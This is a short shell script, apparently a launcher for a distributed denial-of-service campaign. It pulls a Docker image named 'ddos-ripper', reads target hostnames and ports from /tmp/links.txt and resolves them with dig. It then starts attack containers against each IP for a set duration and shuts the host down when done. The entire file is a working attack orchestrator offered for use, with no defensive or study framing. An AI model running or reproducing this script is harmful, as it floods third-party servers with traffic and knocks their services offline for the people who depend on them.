IMAGE="dieputindie/ddos-ripper:latest"
sudo docker pull $IMAGE

if file /tmp/links.txt | grep CRLF; then
    echo "/tmp/links.txt contains CRLF. Converting file"
    sudo vim /tmp/links.txt -c "set ff=unix" -c ":wq"
fi

while read link; do
    while [ $(sudo docker ps | wc -l) -gt 4 ]; do
        sleep 60
    done
    sudo dig +short "$link" >ips

    while read ip; do
        echo "Current target is $ip"
        HOSTNAME=$(echo $ip | awk -F ' ' '{print $1}')
        PORT=$(echo $link | awk -F ' ' '{print $2}')
        echo "HOSTNAME $HOSTNAME"
        echo "PORT $PORT"
        sudo docker stop -t $1 $(sudo docker run -e HOSTNAME=$HOSTNAME -e PORT=$PORT -d --stop-signal 2 $IMAGE) &
        sleep 5
    done <ips

done </tmp/links.txt
sleep $1 # waiting attack time after last links started, before server shutdown
sudo shutdown now
